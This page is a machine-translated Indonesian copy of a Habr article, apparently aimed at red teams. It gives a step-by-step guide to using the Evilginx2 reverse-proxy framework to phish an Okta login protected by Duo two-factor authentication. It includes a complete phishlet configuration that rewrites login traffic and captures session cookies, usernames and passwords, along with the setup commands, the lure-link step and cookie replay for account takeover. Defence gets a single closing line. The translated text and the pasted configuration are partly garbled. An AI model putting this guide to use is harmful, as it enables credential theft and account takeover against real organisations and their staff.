<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🌤️ 🚰 🚴🏻 SHOCK! Perangkat lunak phishing baru memenangkan faktor kedua 🏪 🏴󠁧󠁢󠁥󠁮󠁧󠁿 🙇🏾</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Halo semuanya! 


 Ada saatnya Anda perlu mendaftar untuk seseorang. Ini terjadi ketika organisasi target dikonfigurasikan dengan faktor kedua untuk o...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>SHOCK! Perangkat lunak phishing baru memenangkan faktor kedua</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/431156/"><p>  Halo semuanya! </p><br><p>  Ada saatnya Anda perlu mendaftar untuk seseorang.  Ini terjadi ketika organisasi target dikonfigurasikan dengan faktor kedua untuk otentikasi - sms, autentikator Google, Duo.  Apa yang harus dilakukan dalam kasus seperti itu?  Pekerjakan gopnik?  Untuk memotong telepon di karyawan?  Tidak!  Ternyata peretas licik memiliki perangkat lunak tertulis yang dapat membantu dalam situasi sulit ini. </p><a name="habracut"></a><br><p>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Evilginx2</a> adalah kerangka kerja phishing yang berfungsi sebagai proksi antara korban dan situs, dari mana kami ingin menerima akun.  Sebelumnya, ia menggunakan nginx khusus, tetapi sekarang sepenuhnya ditulis ulang di Go, termasuk mini HTTP dan server DNS, yang sangat menyederhanakan instalasi dan penyebaran. </p><br><p>  Bagaimana cara kerjanya?  Penulis peranti lunak yang <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">dijelaskan</a> secara rinci di situs webnya, perincian tentang pemasangan dan konfigurasi dapat ditemukan di halaman proyek <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">github</a> .  Mengapa mungkin untuk menghindari faktor kedua?  Caranya adalah kita tidak mengganggu proses memasukkan kode dari SMS / kata sandi sementara / push dari DUO.  Kami diam-diam menunggu pengguna untuk berhasil menyelesaikan semua langkah otentikasi, menangkap cookie-nya, dan sudah menggunakannya untuk login.  Sepanjang jalan, kalau-kalau kami mengumpulkan nama pengguna dan kata sandi.  Dalam catatan yang sama, saya akan berbicara tentang pengalaman saya dan jebakan yang saya temui. </p><br><h4 id="zadacha">  Tantangan </h4><br><p>  Jadi, kita perlu mendaftarkan kantor yang secara aktif menggunakan <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Okta</a> sebagai Sistem Masuk Tunggal.  Sebagai faktor kedua, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Duo</a> digunakan - solusi yang chipnya di klien seluler, yang memungkinkan Anda mengonfirmasi faktor kedua melalui pemberitahuan push konvensional alih-alih memasukkan kode 35 digit (halo Google Authenticator).  Mari kita mulai. </p><br><h4 id="shag-pervyy---registriruem-fishingovyy-domen">  Langkah satu - daftarkan domain phishing </h4><br><p> Di panel penyedia kami, tentukan alamat server tempat phishing berada.  Kami juga mendaftarkan subdomain dari formulir <code>okta.&lt; &gt;.com</code> . </p><br><p><img src="https://habrastorage.org/webt/xb/oe/nb/xboenbcldeetjfvpdtbdx7kpu6k.png"></p><br><h4 id="shag-vtoroy---nastraivaem-evilginx">  Langkah Dua - Konfigurasikan Evilginx </h4><br><p>  Kami memulai Evilginx dan melalui perintah <code>config</code> kami memasukkan pengaturan yang diperlukan.  Kami menunjukkan domain utama (bukan subdomain) dan IP-nya. </p><br><pre> <code class="plaintext hljs">config domain &lt; &gt;.com config ip 10.0.0.1</code> </pre> <br><p>  Akibatnya, konfigurasi terlihat seperti ini: </p><br><p><img src="https://habrastorage.org/webt/d-/og/zk/d-ogzkkdfgsv3uc61dyuij7u9o0.png"></p><br><p>  Parameter <code>redirect_url</code> menarik di sini - ini menunjukkan di mana harus mengarahkan permintaan ketika klien datang ke root dari domain kami.  Mengapa ini dilakukan?  Jika Anda memberikan halaman phishing dari root, domain dihitung dengan sangat cepat dan ditambahkan ke daftar situs berbahaya, browser akan bersumpah mengancam, dan pengguna tidak akan pernah menghubungi kami.  Karena itu, kami akan memberikannya melalui tautan unik, dan root akan mengarahkan ke lagu Never Gonna Give You Up. </p><br><h4 id="shag-tretiy---nastraivaem-fishingovuyu-stranicu">  Langkah tiga - buat halaman phishing </h4><br><p>  Di sini kesenangan dimulai.  Karena, pada kenyataannya, di server kami, kami sama sekali tidak meng-host konten apa pun, tetapi hanya permintaan yang diproksi, kami perlu "memberi tahu" Evilginx data apa yang ingin kami terima.  "Kisah" ini kami tulis dalam format khusus.  Dokumentasinya tersedia di halaman <a href="">wiki</a> proyek.  Deskripsiletlet ini disebut.  Untuk beberapa layanan populer - facebook, linkedin, amazon, mereka sudah ditulis dan dimasukkan dalam distribusi.  Kami kurang beruntung, di luar kotak Okta tidak didukung, tetapi orang baik menulis phishlet untuk versi <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">lama</a> .  Kami mengambil file dan mulai menyolder. </p><br><p>  Isi deskripsi, tentukan nama phishlet, penulis, dan versi Evilginx yang diperlukan. </p><br><pre> <code class="plaintext hljs">name: 'okta' author: '@ml_siegel, updated by @hollow1' min_ver: '2.2.0'</code> </pre> <br><p>  Kami menunjukkan domain mana yang akan kami tangkap.  Dalam kasus kami, domain dari formulir <code>&lt;  &gt;.okta.com</code> . </p><br><pre> <code class="plaintext hljs">proxy_hosts: - {phish_sub: '', orig_sub: '&lt;   &gt;', domain: 'okta.com', session: true, is_landing: true}</code> </pre> <br><p>  Parameter <code>session</code> menunjukkan bahwa domain inilah yang memberikan cookie yang kami butuhkan dan kredensial ditransfer ke sana, <code>is_landing</code> berarti bahwa host ini akan digunakan untuk menghasilkan URL phishing. </p><br><p>  Langkah penting berikutnya adalah mengidentifikasi semua permintaan ke domain target sehingga proksi berhasil menulis ulang mereka ke domain phishing.  Jika ini tidak dilakukan, pengguna akan mengirim data bukan kepada kami, tetapi segera ke domain asli, dan kami tidak akan mendapatkan akun apa pun.  Tulis ulang hanya permintaan yang secara langsung terlibat dalam proses login pengguna ke situs. </p><br><p>  Untuk memahami dengan jelas apa yang diperlukan untuk otentikasi yang berhasil, Anda perlu mempelajari proses ini dengan cermat.  Dipersenjatai dengan sendawa dan akun pengujian, kami mulai mencari bagaimana kata sandi dikirimkan dan dengan cookie mana aplikasi menentukan pengguna yang berwenang.  Kami juga mencari jawaban dari server yang berisi tautan ke domain asli. </p><br><p>  Kami menemukan permintaan untuk login dan kata sandi.  Kami melihat bahwa itu dikirim ke domain asli, tetapi kami harus meninggalkan kami. </p><br><p><img src="https://habrastorage.org/webt/gl/nm/cs/glnmcsltdem52njp2nu2ns5c4ds.png"></p><br><p>  Di sini Anda dapat melihat bagaimana domain asli membuat tautan di dalam javascript, mereka harus ditulis ulang. </p><br><p><img src="https://habrastorage.org/webt/g6/x8/mx/g6x8mxyyhdz5jg03eq5hdzg4gbu.png"></p><br><p>  Setelah mengumpulkan ini dan beberapa permintaan lagi, kami mendapatkan pengaturan berikut: </p><br><pre> <code class="plaintext hljs">sub_filters: - {triggers_on: '&lt; &gt;.okta.com', orig_sub: '&lt; &gt;', domain: 'okta.com', search: 'https://{hostname}/api', replace: 'https://{hostname}/api', mimes: ['text/html', 'application/json']} - {triggers_on: 'login.okta.com', orig_sub: 'login', domain: 'okta.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']} - {triggers_on: '&lt; &gt;.okta.com', orig_sub: '', domain: '&lt; &gt;.okta.com', search: 'https\\x3A\\x2F\\x2F{hostname}', replace: 'https\x3A\x2F\x2F{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript', 'text/javascript']} - {triggers_on: '&lt; &gt;.okta.com', orig_sub: '', domain: '&lt; &gt;.okta.com', search: '\\x2Fuser\\x2Fnotifications', replace: 'https\x3A\x2F\x2F&lt; &gt;.okta.com\x2Fuser\x2Fnotifications', mimes: ['text/html', 'application/json', 'application/x-javascript', 'text/javascript']}</code> </pre> <br><p>  Kata kunci <code>{hostname}</code> hanya digunakan untuk mengganti domain asli dengan yang phising.  Baca lebih lanjut tentang sintaks dari bagian ini di <a href="">sini</a> . </p><br><p>  Ingat, kami membutuhkan cookie yang dengannya kami akan masuk ke situs.  Melalui trial and error, kami menemukan nama cookie - <code>sid</code> , dan menambahkannya ke pengaturan: </p><br><pre> <code class="plaintext hljs">auth_tokens: - domain: '&lt; &gt;.okta.com' keys: ['sid']</code> </pre> <br><p>  Nama pengguna dan kata sandi pengguna juga berguna bagi kami, kami telah menemukan permintaan pengirimannya.  Seperti yang Anda lihat dalam permintaan, parameter <code>username</code> dan <code>password</code> kami butuhkan diteruskan ke json, kami menambahkan: </p><br><pre> <code class="plaintext hljs">credentials: username: key: 'username' search: '"username":"([^"]*)' type: 'json' password: key: 'password' search: '"password":"([^"]*)' type: 'json'</code> </pre> <br><p>  Jadi Evilginx akan dapat mengisolasi mereka dari permintaan dan menyimpannya dengan benar. </p><br><p>  Ada sedikit yang tersisa.  Tentukan URL halaman login pada domain target. </p><br><pre> <code class="plaintext hljs">landing_path: - '/login/login.htm'</code> </pre> <br><p>  Kami akan menunjukkan URL yang dengannya kami akan memahami bahwa pengguna berhasil masuk. </p><br><pre> <code class="plaintext hljs">auth_urls: - 'app/UserHome'</code> </pre> <br><p>  Itu saja!  Seluruh konfigurasi: </p><br><pre> <code class="plaintext hljs">name: 'okta' author: '@ml_siegel, updated by @hollow1' min_ver: '2.2.0' proxy_hosts: - {phish_sub: '', orig_sub: '&lt;   &gt;'', domain: 'okta.com', session: true, is_landing: true} sub_filters: sub_filters: - {triggers_on: '&lt; &gt;.okta.com', orig_sub: '&lt; &gt;', domain: 'okta.com', search: 'https://{hostname}/api', replace: 'https://{hostname}/api', mimes: ['text/html', 'application/json']} - {triggers_on: 'login.okta.com', orig_sub: 'login', domain: 'okta.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']} - {triggers_on: '&lt; &gt;.okta.com', orig_sub: '', domain: '&lt; &gt;.okta.com', search: 'https\\x3A\\x2F\\x2F{hostname}', replace: 'https\x3A\x2F\x2F{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript', 'text/javascript']} - {triggers_on: '&lt; &gt;.okta.com', orig_sub: '', domain: '&lt; &gt;.okta.com', search: '\\x2Fuser\\x2Fnotifications', replace: 'https\x3A\x2F\x2F&lt; &gt;.okta.com\x2Fuser\x2Fnotifications', mimes: ['text/html', 'application/json', 'application/x-javascript', 'text/javascript']} - domain: '&lt; &gt;.okta.com' keys: ['sid'] credentials: username: key: 'username' search: '"username":"([^"]*)' type: 'json' password: key: 'password' search: '"password":"([^"]*)' type: 'json' landing_path: - '/login/login.htm' auth_urls: - 'app/UserHome'</code> </pre> <br><p>  Simpan sebagai <code>okta.yaml</code> di <code>/usr/share/evilginx/phishlets</code> . </p><br><h4 id="shag-chetvertyy---vklyuchaem-nash-novyy-fishing">  Langkah empat - aktifkan phishing baru kami </h4><br><p>  Jalankan evilginx dan tulis perintah </p><br><pre> <code class="plaintext hljs">phishlets hostname okta okta.&lt;  &gt;.com</code> </pre> <br><p>  Nyalakan phishlet. </p><br><pre> <code class="plaintext hljs">phishlets enable okta</code> </pre> <br><p>  Sertifikat dari LetsEncrypt secara otomatis dibuat untuk itu. <br>  Periksa pengaturan: </p><br><p><img src="https://habrastorage.org/webt/lr/o8/nb/lro8nbdjq8gjmrggwvsgzkv-uwg.png"></p><br><p>  Kami menunjukkan di mana kami akan mengarahkan pengguna setelah otorisasi berhasil </p><br><pre> <code class="plaintext hljs">phishlets get-url okta https://&lt; &gt;.okta.com/</code> </pre> <br><p>  Aplikasi akan memberikan tautan yang perlu dikirim ke pengguna, dalam bentuk <code>https://&lt; &gt;.com/login/login.htm?rb=9ffe&amp;ec=&lt; &gt;</code> </p><br><h4 id="shag-4---zhdem-ulov">  Langkah 4 - menunggu hasil tangkapan </h4><br><p>  Kami mengirim surat (teknologi pengiriman - bahan untuk artikel terpisah) dan menunggu. <br>  Pengguna yang lemah dan dapat dipercaya mengikuti tautan dan masuk.  Kami melihatnya seperti ini: </p><br><p><img src="https://habrastorage.org/webt/zy/4y/vz/zy4yvz5-jnl4hvnoj6rqjvqqwrc.png"></p><br><p>  Semua akun yang tertangkap menambahkan hingga sesi.  Pilih yang diinginkan dan salin cookie dari itu: </p><br><p><img src="https://habrastorage.org/webt/z7/22/hh/z722hh8g8oxzy8zewtzppg3pa5s.png"></p><br><p>  Buka browser, ganti cookie, dan voila - kami ada di dalam: </p><br><p><img src="https://habrastorage.org/webt/1s/jj/mz/1sjjmzgyhysteprri8xzh0cfey4.png"></p><br><h4 id="posleslovie">  Kata penutup </h4><br><p>  Evilginx sangat menyederhanakan pembuatan halaman phishing, terutama untuk 2FA.  Juga, halaman-halaman ini dengan mudah disimpan dan dibagikan dengan teman-teman.  Cara perlindungan - penggunaan perangkat standar <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">U2F</a> , transisi ke <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">metode</a> otentikasi baru. </p><br><p>  Apa yang Anda pikirkan tentang pendekatan yang dijelaskan?  Bagaimana Anda mengumpulkan akun? </p></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/id431156/">https://habr.com/ru/post/id431156/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id431144/index.html">Far Fields mic (Mic array) - pahlawan yang tidak mencolok di kolom pintar</a></li>
<li><a href="../id431146/index.html">1. Periksa Log Analisis Titik: Aplikasi Titik Periksa resmi untuk Splunk</a></li>
<li><a href="../id431148/index.html">Perusahaan Seluler iOS Baru. Bagian # 1: Pembuatan Kode untuk Sumber Daya</a></li>
<li><a href="../id431152/index.html">Metro 4 adalah perjalanan 6 tahun. Sejarah Singkat Metro UI CSS</a></li>
<li><a href="../id431154/index.html">Kekurangan dalam misi Fallout 76 memungkinkan pemain untuk membuat neraka nuklir</a></li>
<li><a href="../id431158/index.html">Lebih banyak kopi, lebih sedikit kafein: Intel 9th ​​Gen (bagian 2)</a></li>
<li><a href="../id431160/index.html">Bukan peluang tunggal untuk lawan - kami mengadopsi keyboard HyperX Alloy FPS RGB yang sangat cepat</a></li>
<li><a href="../id431162/index.html">Cara menulis rencana keuangan pribadi</a></li>
<li><a href="../id431164/index.html">Studi Solar JSOC: penjahat cyber menjadi lebih profesional</a></li>
<li><a href="../id431166/index.html">Google melembagakan proses administrasi</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>